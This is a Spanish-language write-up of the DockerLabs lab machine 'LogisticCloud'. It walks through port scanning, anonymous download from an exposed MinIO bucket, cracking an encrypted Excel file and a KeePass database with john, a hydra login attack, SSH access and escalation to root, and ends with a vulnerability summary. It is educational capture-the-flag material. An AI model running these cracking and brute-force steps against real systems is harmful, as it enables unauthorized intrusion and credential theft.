@@ -1,0 +1,234 @@
+---
+title: LogisticCloud
+description: Resolución completa de la máquina virtual *LogisticCloud* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **LogisticCloud**, desarrollada por *d1se0* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
+El laboratorio expone un servicio MinIO (S3 compatible) con un bucket expuesto públicamente, permitiendo la descarga de un archivo Excel encriptado. Tras crackear la contraseña del Excel, se extraen credenciales que permiten acceder al panel de login y posteriormente obtener acceso SSH como `prudencia-de-ferrera`.
+Una vez dentro, se encuentra un archivo KeePass (`credentialsDatabase.kdb`) cuya contraseña es crackeada, revelando la contraseña de `root` y completando la escalada de privilegios.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'LogisticCloud',
+    Autor: 'd1se0',
+    Dificultad: 'Media',
+    Fecha: '17/10/2025',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip LogisticCloud.zip
+sudo bash auto_deploy.sh LogisticCloud.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p LogisticCloud/{content,exploits,nmap,scripts}
+cd LogisticCloud
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+* **80/tcp** — HTTP
+* **9000/tcp** — MinIO (S3)
+* **9001/tcp** — MinIO Console
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1766176779/Ports_tutmf8.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p22,80,9000,9001 172.17.0.2
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios:
+
+```bash
+feroxbuster -u http://172.17.0.2 -d 0 \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
+  -x php,txt,html,js,bak,old \
+  -t 40 -C 404,403
+```
+
+![Feroxbuster](https://res.cloudinary.com/dewqswzke/image/upload/v1766176776/Feroxbuster80_hb07og.png)
+
+**Rutas relevantes:**
+- `/index.php` — Panel de autenticación.
+  ![Index80](https://res.cloudinary.com/dewqswzke/image/upload/v1766176776/Index80_bvpssn.png)
+- `/note.txt` — Nota informativa mencionando `/backup.xlsx`.
+- El formulario contiene un campo oculto con el bucket `huguelogistics-data`.
+  ![Login Form](https://res.cloudinary.com/dewqswzke/image/upload/v1766176779/LoginForm_k0tfud.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Interacción con el bucket S3
+
+Se utiliza AWS CLI para interactuar con el endpoint MinIO:
+
+```bash
+aws --no-sign-request --endpoint-url http://172.17.0.2:9000 \
+    s3api get-bucket-policy \
+    --bucket huguelogistics-data
+```
+
+![Policy](https://res.cloudinary.com/dewqswzke/image/upload/v1766176779/Policy_wkbuy9.png)
+
+Se descarga el contenido del bucket:
+
+```bash
+aws --no-sign-request --endpoint-url http://172.17.0.2:9000 \
+    s3 sync s3://huguelogistics-data/ . --no-progress
+```
+
+### 2.2 Crackeo del Excel encriptado
+
+```bash
+office2john backup.xlsx > office_hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt office_hash.txt
+```
+
+![John](https://res.cloudinary.com/dewqswzke/image/upload/v1766176776/John_aa6yem.png)
+
+Contraseña: `launcher`
+
+### 2.3 Extracción de credenciales
+
+```bash
+msoffcrypto-tool backup.xlsx decrypted.xlsx -p "launcher"
+xlsx2csv decrypted.xlsx decrypted.csv
+awk -F',' '{print $6 ":" $7}' decrypted.csv | \
+grep -v "Usuario:Contraseña" | sort -u > credentials.txt
+```
+
+### 2.4 Ataque al panel de login
+
+```bash
+hydra -C credentials.txt 172.17.0.2 http-post-form \
+  "/index.php:bucket=huguelogistics-data&username=^USER^&password=^PASS^:Credenciales incorrectas" \
+  -I -f -t 64
+```
+
+![Hydra](https://res.cloudinary.com/dewqswzke/image/upload/v1766176776/Hydra_yafz9z.png)
+
+### 2.5 Acceso SSH
+
+Se accede al dashboard y se encuentran credenciales SSH para `prudencia-de-ferrera`:
+
+![Bandeja Entrada](https://res.cloudinary.com/dewqswzke/image/upload/v1766176776/BandejaEntrada_vvxhoa.png)
+
+```bash
+ssh prudencia-de-ferrera@172.17.0.2
+```
+
+![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1766176780/SSH_m6qdux.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De prudencia-de-ferrera → root
+
+Se encuentra un archivo KeePass:
+
+```bash
+find / -name "*.kdb*" -type f 2>/dev/null
+```
+
+![KDB](https://res.cloudinary.com/dewqswzke/image/upload/v1766176776/Kdb_as0kwy.png)
+
+Se transfiere y se crackea:
+
+```bash
+keepass2john credentialsDatabase.kdb > keepass_hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt keepass_hash.txt
+```
+
+![John KeePass](https://res.cloudinary.com/dewqswzke/image/upload/v1766176776/JohnKe_qezih2.png)
+
+Contraseña: `princess`
+
+```bash
+su root
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1766176780/Root_mahof5.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Bucket S3 con acceso público de lectura",
+      severity: "Crítica",
+      impact: "Exposición de archivos sensibles"
+    },
+    {
+      vulnerability: "Archivo Excel con contraseña débil",
+      severity: "Alta",
+      impact: "Acceso a información sensible"
+    },
+    {
+      vulnerability: "Contraseñas almacenadas en texto plano en el Excel",
+      severity: "Crítica",
+      impact: "Compromiso de cuentas del sistema"
+    },
+    {
+      vulnerability: "KeePass con contraseña débil",
+      severity: "Crítica",
+      impact: "Escalada de privilegios a root"
+    }
+  ]}
+/>
